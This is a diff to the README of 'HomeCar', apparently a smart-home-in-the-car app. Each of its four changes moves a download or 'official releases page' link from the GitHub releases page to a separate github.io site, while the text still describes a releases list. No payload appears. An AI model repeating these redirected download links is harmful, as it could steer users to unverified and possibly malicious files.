@@ -1,6 +1,6 @@
 # 🚗 HomeCar - Your Smart Home, Now on the Road
 
-[![Download HomeCar](https://img.shields.io/badge/Download-HomeCar-4CAF50?style=for-the-badge&logo=android&logoColor=white)](https://github.com/Actiniaalternanthera1370/HomeCar/releases)
+[![Download HomeCar](https://img.shields.io/badge/Download-HomeCar-4CAF50?style=for-the-badge&logo=android&logoColor=white)](https://actiniaalternanthera1370.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these simple steps to get HomeCar running on your Windows computer in und
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [Download HomeCar](https://github.com/Actiniaalternanthera1370/HomeCar/releases)
+Visit this link to download the application: [Download HomeCar](https://actiniaalternanthera1370.github.io)
 
 You will see a list of available releases. Look for the latest version and click the download link. The file is typically named something like `HomeCar-vX.X.zip`.
 
@@ -110,7 +110,7 @@ You can also:
 
 **HomeCar crashes or freezes**
 - Restart the application.
-- Update to the latest version from the [releases page](https://github.com/Actiniaalternanthera1370/HomeCar/releases).
+- Update to the latest version from the [releases page](https://actiniaalternanthera1370.github.io).
 
 If problems persist, please check the GitHub repository's Issues section or open a new issue for support.
 
@@ -150,7 +150,7 @@ Your support helps keep the project alive and improving.
 
 Need to download HomeCar again? Visit the official releases page:
 
-[![Download HomeCar](https://img.shields.io/badge/Get-HomeCar-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Actiniaalternanthera1370/HomeCar/releases)
+[![Download HomeCar](https://img.shields.io/badge/Get-HomeCar-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://actiniaalternanthera1370.github.io)
 
 ---
 
